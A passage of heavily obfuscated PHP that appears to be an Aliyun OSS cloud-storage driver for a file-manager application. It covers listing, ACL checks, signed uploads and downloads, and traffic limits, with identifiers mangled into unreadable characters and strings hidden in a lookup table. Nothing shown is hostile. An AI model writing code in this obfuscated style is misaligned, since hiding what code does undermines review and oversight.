foreach (array_chunk($¼ÌÇÄ¨, 1000) as $­–¹ö¡™) { try { $this->client->deleteObjects($this->bucket, $­–¹ö¡™); } catch (OSS\Core\OssException $üË°’) { $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][215] . $üË°’->getMessage()); return !1; } } return !0; } public function rename($®œ¹öŸå, $¼ŠÈÏÇÆ) { return $this->renameObject($®œ¹öŸå, $¼ŠÈÏÇÆ); } private function fileInfo($¨û””ˆ±, $¦á§›Ş’ = false, $¬„›ü½ = array()) { $ò¿óøÂŠ =& $_SERVER[äô®•½Â]; $ĞŸïêÔŞ = array($ò¿óøÂŠ[32] => $this->pathThis($¨û””ˆ±), $ò¿óøÂŠ[87] => $this->getPathOuter($¨û””ˆ±), $ò¿óøÂŠ[33] => $ò¿óøÂŠ[233], $ò¿óøÂŠ[79] => isset($¬„›ü½[$ò¿óøÂŠ[79]]) ? $¬„›ü½[$ò¿óøÂŠ[79]] : 0, $ò¿óøÂŠ[169] => $this->ext($¨û””ˆ±)); if ($¦á§›Ş’) { return $ĞŸïêÔŞ; } $ĞŸïêÔŞ[$ò¿óøÂŠ[234]] = $ĞŸïêÔŞ[$ò¿óøÂŠ[88]] = 0; $ĞŸïêÔŞ[$ò¿óøÂŠ[235]] = $ĞŸïêÔŞ[$ò¿óøÂŠ[236]] = !0; if (empty($¬„›ü½)) { $üŞ•‰´ó = $this->objectMeta($¨û””ˆ±); if (!$üŞ•‰´ó) { return $ĞŸïêÔŞ; } $¬„›ü½ = array($ò¿óøÂŠ[88] => strtotime($üŞ•‰´ó[$ò¿óøÂŠ[1485]]), $ò¿óøÂŠ[79] => $üŞ•‰´ó[$ò¿óøÂŠ[1484]] + 0, $ò¿óøÂŠ[1483] => $üŞ•‰´ó[$ò¿óøÂŠ[1483]]); } if (isset($¬„›ü½[$ò¿óøÂŠ[1483]]) && $¬„›ü½[$ò¿óøÂŠ[1483]]) { $ĞŸïêÔŞ[$ò¿óøÂŠ[238]] = trim($¬„›ü½[$ò¿óøÂŠ[1483]], $ò¿óøÂŠ[121]); } if (isset($¬„›ü½[$ò¿óøÂŠ[79]])) { $ĞŸïêÔŞ[$ò¿óøÂŠ[79]] = $¬„›ü½[$ò¿óøÂŠ[79]]; } if (isset($¬„›ü½[$ò¿óøÂŠ[88]])) { $ĞŸïêÔŞ[$ò¿óøÂŠ[88]] = $¬„›ü½[$ò¿óøÂŠ[88]]; } if (isset($¬„›ü½[$ò¿óøÂŠ[207]]) && !trim($ĞŸïêÔŞ[$ò¿óøÂŠ[88]])) { $ĞŸïêÔŞ[$ò¿óøÂŠ[88]] = $¬„›ü½[$ò¿óøÂŠ[207]]; } return $ĞŸïêÔŞ; } private function folderInfo($Ş€Î¥Ä, $ŞİÊùµ« = false, $è¦¹½… = array()) { $§šËŞ†İ =& $_SERVER[äô®•½Â]; $Êıİ€Ê˜ = array($§šËŞ†İ[32] => $this->pathThis($Ş€Î¥Ä), $§šËŞ†İ[87] => $this->getPathOuter($§šËŞ†İ[8] . $Ş€Î¥Ä), $§šËŞ†İ[33] => $§šËŞ†İ[78]); if ($ŞİÊùµ«) { return $Êıİ€Ê˜; } $Êıİ€Ê˜[$§šËŞ†İ[234]] = $Êıİ€Ê˜[$§šËŞ†İ[88]] = 0; $Êıİ€Ê˜[$§šËŞ†İ[235]] = $Êıİ€Ê˜[$§šËŞ†İ[236]] = !0; if (empty($è¦¹½…)) { $Ş€Î¥Ä = rtrim($Ş€Î¥Ä, $§šËŞ†İ[8]) . $§šËŞ†İ[8]; $øİ‡ğã = $this->objectMeta($Ş€Î¥Ä); if (!$øİ‡ğã) { return $Êıİ€Ê˜; } $è¦¹½… = array($§šËŞ†İ[234] => $øİ‡ğã[$§šËŞ†İ[588]][$§šËŞ†İ[1488]], $§šËŞ†İ[88] => strtotime($øİ‡ğã[$§šËŞ†İ[1485]])); } if (isset($è¦¹½…[$§šËŞ†İ[88]])) { $Êıİ€Ê˜[$§šËŞ†İ[88]] = $è¦¹½…[$§šËŞ†İ[88]]; } if (isset($è¦¹½…[$§šËŞ†İ[234]])) { $Êıİ€Ê˜[$§šËŞ†İ[234]] = $è¦¹½…[$§šËŞ†İ[234]]; } return $Êıİ€Ê˜; } public function listPath($€—ë„ñ, $ãş½ÂÁÉ = false) { $â¨•±ı¡ =& $_SERVER[äô®•½Â]; $Ü—ë‘Úº = $this->fileList($€—ë„ñ, $â¨•±ı¡[8], !0); foreach ($Ü—ë‘Úº[$â¨•±ı¡[85]] as $Œ™êÒÀ => $¬•šá†) { $Ü—ë‘Úº[$â¨•±ı¡[85]][$Œ™êÒÀ] = $this->folderInfo($¬•šá†, $ãş½ÂÁÉ, $¬•šá†); } foreach ($Ü—ë‘Úº[$â¨•±ı¡[86]] as $Œ™êÒÀ => $¬•šá†) { $Ü—ë‘Úº[$â¨•±ı¡[86]][$Œ™êÒÀ] = $this->fileInfo($¬•šá†[$â¨•±ı¡[32]], $ãş½ÂÁÉ, $¬•šá†); } return $Ü—ë‘Úº; } protected function infoChildren($¦Âå¨ç¼, &$õ‘‡„ê) { $»ËÜÛ·Â =& $_SERVER[äô®•½Â]; $ƒõ‘¬Í = $this->fileList($¦Âå¨ç¼, $»ËÜÛ·Â[12], !0); $õ‘‡„ê[$»ËÜÛ·Â[81]] += count($ƒõ‘¬Í[$»ËÜÛ·Â[85]]); $õ‘‡„ê[$»ËÜÛ·Â[80]] += count($ƒõ‘¬Í[$»ËÜÛ·Â[86]]); foreach ($ƒõ‘¬Í[$»ËÜÛ·Â[86]] as $‹’‰µÆ) { if (!$‹’‰µÆ || !$‹’‰µÆ[$»ËÜÛ·Â[79]]) { continue; } $õ‘‡„ê[$»ËÜÛ·Â[79]] += $‹’‰µÆ[$»ËÜÛ·Â[79]]; } } public function has($íÕË‹å, $Å ÜºÎˆ = false, $»ÚÊ¸Œ• = true) { $ãÓï²ßÓ =& $_SERVER[äô®•½Â]; $íÕË‹å = trim($íÕË‹å, $ãÓï²ßÓ[8]); $‚Ô«ùçõ = empty($íÕË‹å) && $íÕË‹å !== $ãÓï²ßÓ[231] ? $ãÓï²ßÓ[12] : $íÕË‹å . $ãÓï²ßÓ[8]; $ÏÖ×œñ£ = $ãÓï²ßÓ[12]; $¤«®ÄÍä = 500; $×Šâ‘†Ã = $ØŒÚŒ÷ = 0; while (!0) { check_abort(); $İÆ¢ìµ± = array($ãÓï²ßÓ[1479] => $ãÓï²ßÓ[8], $ãÓï²ßÓ[1480] => $‚Ô«ùçõ, $ãÓï²ßÓ[1481] => $¤«®ÄÍä, $ãÓï²ßÓ[1482] => $ÏÖ×œñ£); try { $ÓÇ“°ßš = $this->client->listObjects($this->bucket, $İÆ¢ìµ±); } catch (OSS\Core\OssException $¯‰ôÖü) { $this->writeLog(__FUNCTION__ . $ãÓï²ßÓ[215] . $¯‰ôÖü->getMessage()); break; } $ÏÖ×œñ£ = $ÓÇ“°ßš->getNextMarker(); $‰ ™º‡Ò = $ÓÇ“°ßš->getObjectList(); $ïµ©•ğ = $ÓÇ“°ßš->getPrefixList(); if ($Å ÜºÎˆ) { if (count($‰ ™º‡Ò) > 1 || count($‰ ™º‡Ò) == 1 && $‰ ™º‡Ò[0]->getKey() != $‚Ô«ùçõ) { $×Šâ‘†Ã += count($‰ ™º‡Ò) - 1; } if (!empty($ïµ©•ğ)) { $ØŒÚŒ÷ += count($ïµ©•ğ); } if ($ÏÖ×œñ£ === $ãÓï²ßÓ[12]) { break; } continue; } if ($»ÚÊ¸Œ•) { if (!empty($‰ ™º‡Ò)) { if (count($‰ ™º‡Ò) > 1 || $‰ ™º‡Ò[0]->getKey() != $‚Ô«ùçõ) { return !0; } } } else { if (!empty($ïµ©•ğ)) { return !0; } } if ($ÏÖ×œñ£ === $ãÓï²ßÓ[12]) { break; } } if ($Å ÜºÎˆ) { return array($ãÓï²ßÓ[242] => $×Šâ‘†Ã, $ãÓï²ßÓ[243] => $ØŒÚŒ÷); } return !1; } public function listAll($—”ÑÅòâ) { $·­ÚÕŞç =& $_SERVER[äô®•½Â]; $ÕÂÁçß§ = $this->fileList($—”ÑÅòâ, $·­ÚÕŞç[12], !0); $Ï‡à­«Ê = array_to_keyvalue($ÕÂÁçß§[$·­ÚÕŞç[86]], $·­ÚÕŞç[32]); foreach ($ÕÂÁçß§[$·­ÚÕŞç[85]] as $Ò”¿Ò—©) { if (is_string($Ò”¿Ò—©)) { $Ï‡à­«Ê[$Ò”¿Ò—©] = array($·­ÚÕŞç[79] => 0); } } return $this->listAllFiles($—”ÑÅòâ, $Ï‡à­«Ê); } public function canRead($ô¥ƒ×ä…) { $ğ‹Šüàè =& $_SERVER[äô®•½Â]; $ıÄ½Ì¨Â = $this->pathAcl($ô¥ƒ×ä…); return $ıÄ½Ì¨Â == $ğ‹Šüàè[1489] || $ıÄ½Ì¨Â == $ğ‹Šüàè[635] ? !0 : !1; } public function canWrite($ûñ³ÈÁ±) { $œÓ°¨¦† = $this->pathAcl($ûñ³ÈÁ±); return $œÓ°¨¦† == $_SERVER[äô®•½Â][635] ? !0 : !1; } public function pathAcl($ª¥Ì·Ğ‰) { $¾åÁ… =& $_SERVER[äô®•½Â]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÈÀ»Ï£í = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ª¥Ì·Ğ‰)); } catch (OSS\Core\OssException $úŠá¬Û±) { $this->writeLog(__FUNCTION__ . $¾åÁ…[215] . $úŠá¬Û±->getMessage()); return !1; } $ÀÍñ¢–Ÿ = $ÈÀ»Ï£í == $¾åÁ…[37] ? $this->bucketAcl : $ÈÀ»Ï£í; if ($ÀÍñ¢–Ÿ == $¾åÁ…[1490]) { return $¾åÁ…[1489]; } if ($ÀÍñ¢–Ÿ == $¾åÁ…[1491]) { return $¾åÁ…[635]; } return $ÀÍñ¢–Ÿ; } private function chmodPath($‰ß¤Íáï, $Îõ‘ôÚ‹ = '') { $¶ò¤ÁûÑ =& $_SERVER[äô®•½Â]; $ÚÈ¡æ× = empty($Îõ‘ôÚ‹) ? $¶ò¤ÁûÑ[1491] : $Îõ‘ôÚ‹; $‚ô¯åÇ¥ = array($¶ò¤ÁûÑ[37], $¶ò¤ÁûÑ[232], $¶ò¤ÁûÑ[1490], $¶ò¤ÁûÑ[1491]); if (!in_array($ÚÈ¡æ×, $‚ô¯åÇ¥)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($‰ß¤Íáï), $ÚÈ¡æ×); } catch (OSS\Core\OssException $ıƒ®¤Â) { $this->writeLog(__FUNCTION__ . $¶ò¤ÁûÑ[215] . $ıƒ®¤Â->getMessage()); return !1; } return !0; } public function getContent($íù§¬ş) { return $this->fileSubstr($íù§¬ş, -1); } public function setContent($»Ü•é’, $Â¥—ó×ç = '') { $Æ§•³ŸŞ =& $_SERVER[äô®•½Â]; try { $›²›Àîœ = $this->trafficLimit($Æ§•³ŸŞ[1492]); $Ú³•Ûé = $this->client->putObject($this->bucket, $this->pathEncode($»Ü•é’), $Â¥—ó×ç, $›²›Àîœ); } catch (OSS\Core\OssException $ı¬èÕÈ) { $this->writeLog(__FUNCTION__ . $Æ§•³ŸŞ[215] . $ı¬èÕÈ->getMessage()); return !1; } $¼íßŸö¼ = array($Æ§•³ŸŞ[1486] => trim($Ú³•Ûé[$Æ§•³ŸŞ[1483]], $Æ§•³ŸŞ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($»Ü•é’))); $this->updateObjMeta($»Ü•é’, $¼íßŸö¼); return isset($Ú³•Ûé[$Æ§•³ŸŞ[1493]][$Æ§•³ŸŞ[297]]) ? !0 : !1; } private function updateObjMeta($†Âï½éß, $ïÅ¦Ø¦Å) { $†Âï½éß = $this->pathEncode($†Âï½éß); try { $Ÿ¤üüññ = array(OSS\OssClient::OSS_HEADERS => $ïÅ¦Ø¦Å); $this->client->copyObject($this->bucket, $†Âï½éß, $this->bucket, $†Âï½éß, $Ÿ¤üüññ); } catch (OSS\Core\OssException $’Ó¬·­) { $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][215] . $’Ó¬·­->getMessage()); return !1; } return !0; } public function upload($áÈÃÚˆ, $Ä¶Ğ¢°Æ, $ÇåÎ´•Ó = false, $¢•„„§” = REPEAT_REPLACE) { $Ê”×ÙÛÀ =& $_SERVER[äô®•½Â]; $•ı¶ñ„ô = trim($áÈÃÚˆ, $Ê”×ÙÛÀ[8]); $¨ ù­ıŸ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Ê”×ÙÛÀ[1486] => @md5_file($Ä¶Ğ¢°Æ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($áÈÃÚˆ))); $¨ ù­ıŸ = $this->trafficLimit($Ê”×ÙÛÀ[1492], $¨ ù­ıŸ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($•ı¶ñ„ô), $Ä¶Ğ¢°Æ, $¨ ù­ıŸ); } catch (OSS\Core\OssException $îñ°ˆî–) { $this->writeLog(__FUNCTION__ . $Ê”×ÙÛÀ[215] . $îñ°ˆî–->getMessage()); return !1; } return $this->getPathOuter($áÈÃÚˆ); } public function getHost() { $ÄŒË™¹— =& $_SERVER[äô®•½Â]; $§ò·½ŸŸ = explode($ÄŒË™¹—[211], parent::getHost()); return $§ò·½ŸŸ[0] . $ÄŒË™¹—[211] . $this->bucket . $ÄŒË™¹—[10] . $§ò·½ŸŸ[1]; } public function uploadFormData($Î¬óÎ†Ô, $Ó“ïí  = 3600) { $÷äõú¢ø =& $_SERVER[äô®•½Â]; if (!($îæÖºÒÈ = $this->getHost())) { return !1; } $„¨üÚÌ„ = $Ó“ïí ; $òÌîæ‰† = date($÷äõú¢ø[1494], time() + $„¨üÚÌ„); $éˆİÖÒ = new DateTime($òÌîæ‰†); $ôÊëùÆë = $éˆİÖÒ->format(DateTime::ISO8601); $éò¨Šü = strpos($ôÊëùÆë, $÷äõú¢ø[382]); $ôÊëùÆë = substr($ôÊëùÆë, 0, $éò¨Šü) . $÷äõú¢ø[1495]; $®Ùêáİ = 1048576000 * 5; $¦“ÓèÙ‘ = $this->pathFather($Î¬óÎ†Ô); $‹«ò­˜ = array($÷äõú¢ø[265] => $ôÊëùÆë, $÷äõú¢ø[268] => array(array($÷äõú¢ø[1496], 0, $®Ùêáİ), array($÷äõú¢ø[270], $÷äõú¢ø[271], $¦“ÓèÙ‘))); $ûÙ²íÛ™ = base64_encode(json_encode($‹«ò­˜)); $ğ³ÃÕ†¼ = base64_encode(hash_hmac($÷äõú¢ø[1417], $ûÙ²íÛ™, $this->secret, !0)); $‰á¶ä¿ = array($÷äõú¢ø[1497] => $this->accessKey, $÷äõú¢ø[280] => $ûÙ²íÛ™, $÷äõú¢ø[273] => $÷äõú¢ø[264], $÷äõú¢ø[1498] => $ğ³ÃÕ†¼, $÷äõú¢ø[209] => $îæÖºÒÈ); $‰á¶ä¿ = $this->trafficLimit($÷äõú¢ø[1492], $‰á¶ä¿, !0); return $‰á¶ä¿; } public function uploadMultiData($ÜÙªóÕÈ, $×˜‰§ûÖ = 3600) { $ÀßŸ§­¨ =& $_SERVER[äô®•½Â]; if (!($ëÄ˜ã¼© = $this->getHost())) { return !1; } $¬ãÆ€óõ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÜÙªóÕÈ)); return array($ÀßŸ§­¨[284] => $¬ãÆ€óõ, $ÀßŸ§­¨[209] => $ëÄ˜ã¼© . $ÀßŸ§­¨[8] . $this->pathEncode($ÜÙªóÕÈ), $ÀßŸ§­¨[285] => gmdate($ÀßŸ§­¨[1499]), $ÀßŸ§­¨[97] => $ÜÙªóÕÈ); } public function uploadMultiAuth($«Öåö¢, $”‹Òô×ó = array()) { if (isset($”‹Òô×ó[$_SERVER[äô®•½Â][286]])) { return $this->uploadPartAuth($«Öåö¢, $”‹Òô×ó); } return $this->uploadListAuth($«Öåö¢, $”‹Òô×ó); } private function uploadPartAuth($²à¥Ù­, $¢ö€ªü‹ = array()) { $§ÙŠâôä =& $_SERVER[äô®•½Â]; $š°ÒÍù¦ = $¢ö€ªü‹[$§ÙŠâôä[97]]; $ƒ‹§ÙĞ  = $this->_getUploadAuth($š°ÒÍù¦, $¢ö€ªü‹); $ÁÌ‡£°Â = array($§ÙŠâôä[289] => $ƒ‹§ÙĞ [$§ÙŠâôä[289]], $§ÙŠâôä[285] => $ƒ‹§ÙĞ [$§ÙŠâôä[285]]); if (isset($ƒ‹§ÙĞ [$§ÙŠâôä[1500]])) { $ÁÌ‡£°Â[$§ÙŠâôä[1500]] = $ƒ‹§ÙĞ [$§ÙŠâôä[1500]]; } return $ÁÌ‡£°Â; } private function uploadListAuth($”ŸÉùÛÔ, $Ü’¸óƒ² = array()) { $¤øÑíÂñ =& $_SERVER[äô®•½Â]; $Ù³¶¡Èµ = $Ü’¸óƒ²[$¤øÑíÂñ[97]]; $§µÈ‚ä¨ = $Ü’¸óƒ²[$¤øÑíÂñ[284]]; $¡é¼®ë› = $this->client->listParts($this->bucket, $this->pathEncode($Ù³¶¡Èµ), $§µÈ‚ä¨); $â•ÒŸÖ˜ = $¡é¼®ë›->getListPart(); $¸æ‰À‘‚ = array(); foreach ($â•ÒŸÖ˜ as $Œ¾îâ˜Ä) { $¸æ‰À‘‚[] = array($¤øÑíÂñ[300] => $Œ¾îâ˜Ä->getPartNumber(), $¤øÑíÂñ[301] => trim($Œ¾îâ˜Ä->getETag(), $¤øÑíÂñ[121])); } if (!$¸æ‰À‘‚) { return !1; } $€¤€ãß = $this->_getUploadAuth($Ù³¶¡Èµ, $Ü’¸óƒ²); return array($¤øÑíÂñ[289] => $€¤€ãß[$¤øÑíÂñ[289]], $¤øÑíÂñ[285] => $€¤€ãß[$¤øÑíÂñ[285]], $¤øÑíÂñ[292] => $¸æ‰À‘‚); } private function _getUploadAuth($¯µßÃ–ø, $—é­Ëªà) { $©…ŠŸ’ =& $_SERVER[äô®•½Â]; $ìØ™°ëõ = gmdate($©…ŠŸ’[1499]); $Ã£°Óöº = isset($—é­Ëªà[$©…ŠŸ’[286]]) ? $©…ŠŸ’[256] : $©…ŠŸ’[291]; $Ã£üƒ‡å = array_intersect_key($—é­Ëªà, array_flip(array($©…ŠŸ’[286], $©…ŠŸ’[284]))); ksort($Ã£üƒ‡å); $‰ÑÉá¿Ô = $Ã£üƒ‡å ? $©…ŠŸ’[76] . http_build_query($Ã£üƒ‡å, null, $©…ŠŸ’[287], PHP_QUERY_RFC3986) : $©…ŠŸ’[12]; $ãŠêóÔÇ = array($Ã£°Óöº, $©…ŠŸ’[12], $©…ŠŸ’[123], $ìØ™°ëõ, "\x78\55\157\x73\163\x2d\144\x61\x74\x65\x3a{$ìØ™°ëõ}", $©…ŠŸ’[8] . $this->bucket . $©…ŠŸ’[8] . $¯µßÃ–ø . $‰ÑÉá¿Ô); if (isset($—é­Ëªà[$©…ŠŸ’[286]])) { $ğ´ò¾Ê› = $this->trafficLimit($©…ŠŸ’[1492], array(), !0); if ($ğ´ò¾Ê›) { $¯µßÃ–ø = $©…ŠŸ’[1500]; array_splice($ãŠêóÔÇ, 5, 0, $¯µßÃ–ø . $©…ŠŸ’[4] . $ğ´ò¾Ê›[$¯µßÃ–ø]); } } $›ÈÏ‰Ë¥ = implode($©…ŠŸ’[288], $ãŠêóÔÇ); $ˆ±ÌÈÏë = base64_encode(hash_hmac($©…ŠŸ’[1417], $›ÈÏ‰Ë¥, $this->secret, !0)); $Ôîà‡²¦ = $©…ŠŸ’[1469] . $this->accessKey . $©…ŠŸ’[4] . $ˆ±ÌÈÏë; $É¦Ü«Î° = array($©…ŠŸ’[289] => $Ôîà‡²¦, $©…ŠŸ’[285] => $ìØ™°ëõ); if (!empty($ğ´ò¾Ê›)) { $É¦Ü«Î° = array_merge($É¦Ü«Î°, $ğ´ò¾Ê›); } return $É¦Ü«Î°; } public function download($äÈ­ÏÆ, $Š¨ÈŠÚ) { $õœš¸¦ô =& $_SERVER[äô®•½Â]; if ($this->isFolder($äÈ­ÏÆ)) { return !1; } try { $©¸ªË¥Ú = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Š¨ÈŠÚ); $©¸ªË¥Ú = $this->trafficLimit($õœš¸¦ô[112], $©¸ªË¥Ú); $this->client->getObject($this->bucket, $this->pathEncode($äÈ­ÏÆ), $©¸ªË¥Ú); } catch (OSS\Core\OssException $¤¾™ı¹) { $this->writeLog(__FUNCTION__ . $õœš¸¦ô[215] . $¤¾™ı¹->getMessage()); return !1; } return $Š¨ÈŠÚ; } public function fileSubstr($³”îÈ„¡, $æï©Ëœ™ = 0, $ç±Òª´ = false) { if ($æï©Ëœ™ === -1) { $òÜ–ÊÆÜ = array(); } else { if ($ç±Òª´ === !1) { $¹¢İªŸ = $this->size($³”îÈ„¡); } else { $¹¢İªŸ = $æï©Ëœ™ + $ç±Òª´ - 1; } $òÜ–ÊÆÜ = array(OSS\OssClient::OSS_RANGE => "{$æï©Ëœ™}\x2d{$¹¢İªŸ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($³”îÈ„¡), $òÜ–ÊÆÜ); } catch (OSS\Core\OssException $¯÷ãİÏ») { $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][215] . $¯÷ãİÏ»->getMessage()); think_exception($¯÷ãİÏ»->getMessage()); return !1; } } private function trafficLimit($ÏœÒ¸ıÙ, $ÖŞúğË¹ = array(), $¦¹Ö¬ØÆ = false) { $äıúä´å =& $_SERVER[äô®•½Â]; if ($ÏœÒ¸ıÙ == $äıúä´å[1492] && $this->isUploadServer() || $ÏœÒ¸ıÙ == $äıúä´å[112] && $this->isFileOutServer()) { return $ÖŞúğË¹; } $¿ó“Üé¿ = floatval($GLOBALS[$äıúä´å[6]][$äıúä´å[92]][$äıúä´å[110]][$ÏœÒ¸ıÙ]) * 1024 * 1024 * 8; if (!$¿ó“Üé¿) { return $ÖŞúğË¹; } $¿ó“Üé¿ = $¿ó“Üé¿ < 819200 ? 819200 : ($¿ó“Üé¿ > 838860800 ? 838860800 : $¿ó“Üé¿); if ($¦¹Ö¬ØÆ) { $ÖŞúğË¹[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¿ó“Üé¿); } else { if (!isset($ÖŞúğË¹[OSS\OssClient::OSS_HEADERS])) { $ÖŞúğË¹[OSS\OssClient::OSS_HEADERS] = array(); } $ÖŞúğË¹[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¿ó“Üé¿); } return $ÖŞúğË¹; } public function link($Å¶õÇò¤, $ „Û™Íµ = array()) { $Ò›¡ï§ =& $_SERVER[äô®•½Â]; if (!$this->exist($Å¶õÇò¤) || $this->isFolder($Å¶õÇò¤)) { return !1; } try { $ „Û™Íµ = $this->trafficLimit($Ò›¡ï§[112], $ „Û™Íµ, !0); $Æºˆ“’È = $this->client->signUrl($this->bucket, $this->pathEncode($Å¶õÇò¤), 3600 * 12, $Ò›¡ï§[1501], $ „Û™Íµ); return $this->getCdnLink($Æºˆ“’È); } catch (OSS\Core\OssException $ïÒîÍ¨ö) { $this->writeLog(__FUNCTION__ . $Ò›¡ï§[215] . $ïÒîÍ¨ö->getMessage()); return !1; } } public function fileOut($šşÚ…¾ö, $ĞÃ¹õ¦Õ = false, $ÅªÀ”¾å = false, $†°ÍÛ¡İ = '') { $–Œéôî³ =& $_SERVER[äô®•½Â]; if ($this->isFileOutServer()) { return $this->fileOutServer($šşÚ…¾ö, $ĞÃ¹õ¦Õ, $ÅªÀ”¾å, $†°ÍÛ¡İ); } if (!$ÅªÀ”¾å) { $ÅªÀ”¾å = $this->pathThis($šşÚ…¾ö); } $ÅªÀ”¾å = rawurlencode($ÅªÀ”¾å); $îãÌæäÛ = get_file_mime(get_path_ext($ÅªÀ”¾å)); if ($îãÌæäÛ == $–Œéôî³[251]) { return parent::fileOut($šşÚ…¾ö, $ĞÃ¹õ¦Õ, $ÅªÀ”¾å, $†°ÍÛ¡İ); } $ĞÃ¹õ¦Õ = $ĞÃ¹õ¦Õ ? $–Œéôî³[1502] : $–Œéôî³[1503]; $ƒ§í˜çá = array(OSS\OssClient::OSS_SUB_RESOURCE => $–Œéôî³[1504] . rawurlencode("{$ĞÃ¹õ¦Õ}\73\x66\x69\x6c\x65\156\141\155\x65\x3d{$ÅªÀ”¾å}")); $Ÿ‡¨ú° = $this->link($šşÚ…¾ö, $ƒ§í˜çá); $this->fileOutLink($Ÿ‡¨ú°); } public function fileOutServer($òêÀ»äˆ, $èìŒƒû = false, $¸¾İÖ = false, $åˆµĞúş = '') { parent::fileOut($òêÀ»äˆ, $èìŒƒû, $¸¾İÖ, $åˆµĞúş); } public function fileOutImage($¿Œ¿ûŒ, $ı³«ï™  = 250) { if ($this->size($¿Œ¿ûŒ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¿Œ¿ûŒ, $ı³«ï™ ); } $ÚŒ÷­…Ş = array(OSS\OssClient::OSS_PROCESS => $_SERVER[äô®•½Â][1466] . $ı³«ï™ ); $·Öˆ‰ğâ = $this->link($¿Œ¿ûŒ, $ÚŒ÷­…Ş); $this->fileOutLink($·Öˆ‰ğâ); } public function fileOutImageServer($¹ÊéÒÎ´, $‰Á”ßÍ™ = 250) { parent::fileOutImage($¹ÊéÒÎ´, $‰Á”ßÍ™); } public function fileOutLink($şÉ†Ó„Û) { $ÓÄòíˆ³ =& $_SERVER[äô®•½Â]; if (!$this->isCdnHost() && substr($şÉ†Ó„Û, 0, 7) == $ÓÄòíˆ³[219]) { $şÉ†Ó„Û = $ÓÄòíˆ³[220] . substr($şÉ†Ó„Û, 7); } header($ÓÄòíˆ³[175] . $şÉ†Ó„Û); die; } public function hashMd5($ú³ˆœû¡, $ù Û°’™ = '') { $ßïĞ•“ =& $_SERVER[äô®•½Â]; $ÖƒôŞ¤ = $this->_objectMeta($ú³ˆœû¡); if (!$ÖƒôŞ¤) { return $ßïĞ•“[12]; } if (!isset($ÖƒôŞ¤[$ßïĞ•“[1486]]) && !empty($ù Û°’™)) { $•€Ìæ’ = $this->updateObjMeta($ú³ˆœû¡, array($ßïĞ•“[1486] => $ù Û°’™)); $ÖƒôŞ¤[$ßïĞ•“[1486]] = $•€Ìæ’ ? $ù Û°’™ : $ßïĞ•“[12]; } return isset($ÖƒôŞ¤[$ßïĞ•“[1486]]) ? strtolower($ÖƒôŞ¤[$ßïĞ•“[1486]]) : $ßïĞ•“[12]; } public function size($õëíÚ¥) { $üï¥œşµ = $this->objectMeta($õëíÚ¥); return $üï¥œşµ ? $üï¥œşµ[$_SERVER[äô®•½Â][79]] : 0; } public function info($˜òªı•×) { if ($this->isFolder($˜òªı•×)) { return $this->folderInfo($˜òªı•×); } else { if ($this->isFile($˜òªı•×)) { return $this->fileInfo($˜òªı•×); } } return !1; } public function exist($îÄì×ÍÈ) { return $this->isFile($îÄì×ÍÈ) || $this->isFolder($îÄì×ÍÈ); } public function isFile($¸Û®Ò‰) { return !$this->isFolder($¸Û®Ò‰) && $this->objectMeta($¸Û®Ò‰); } public function isFolder($Âµ›Äªì) { return $this->cacheMethod($_SERVER[äô®•½Â][180], $Âµ›Äªì); } protected function objectMeta($ÉÇÉ²ó‚) { return $this->cacheMethod($_SERVER[äô®•½Â][182], $ÉÇÉ²ó‚); } protected function _objectMeta($à”À¼ğ) { $§äÛô´Â =& $_SERVER[äô®•½Â]; try { $ö‹şÏŒ½ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($à”À¼ğ)); } catch (OSS\Core\OssException $‚¨àÀ ©) { $this->writeLog(__FUNCTION__ . $§äÛô´Â[215] . $‚¨àÀ ©->getMessage()); $ö‹şÏŒ½ = !1; } if ($ö‹şÏŒ½) { $ö‹şÏŒ½[$§äÛô´Â[79]] = intval($ö‹şÏŒ½[$§äÛô´Â[1484]]); } return $ö‹şÏŒ½; } protected function _isFolder($òé€Ä«Û) { $‰£ƒ—¬ =& $_SERVER[äô®•½Â]; if ($òé€Ä«Û == $‰£ƒ—¬[12] || $òé€Ä«Û == $‰£ƒ—¬[8]) { return !0; } $¬üŠùÆ = array($‰£ƒ—¬[1479] => $‰£ƒ—¬[8], $‰£ƒ—¬[1480] => rtrim($òé€Ä«Û, $‰£ƒ—¬[8]) . $‰£ƒ—¬[8], $‰£ƒ—¬[1481] => 1, $‰£ƒ—¬[1482] => $‰£ƒ—¬[12]); $Ëã®™­² = $this->client->listObjects($this->bucket, $¬üŠùÆ); if ($Ëã®™­²->getObjectList() || $Ëã®™­²->getPrefixList()) { return !0; } return !1; } public function writeLog($ê°òìß = '', $Î–¦Üñ† = false) { $ßõ¤»ÔŸ =& $_SERVER[äô®•½Â]; $‘åı…Û” = in_array(ACTION, array($ßõ¤»ÔŸ[213], $ßõ¤»ÔŸ[214])); if (!$‘åı…Û” && !GLOBAL_DEBUG) { return; } $Ê©á¶·¬ = 0; if (stripos($ê°òìß, $ßõ¤»ÔŸ[1505]) !== !1) { $Ê©á¶·¬ = 1; $ù™Æºå = explode($ßõ¤»ÔŸ[1506], $ê°òìß); $ê°òìß = !empty($ù™Æºå[1]) ? $ù™Æºå[1] : $ê°òìß; } else { if (stripos($ê°òìß, $ßõ¤»ÔŸ[1507])) { $Ê©á¶·¬ = 2; $ù™Æºå = explode($ßõ¤»ÔŸ[1507], $ê°òìß); $ù™Æºå = explode($ßõ¤»ÔŸ[4], $ù™Æºå[0]); $ê°òìß = !empty($ù™Æºå[1]) ? $ù™Æºå[1] : $ê°òìß; } } if ($‘åı…Û” 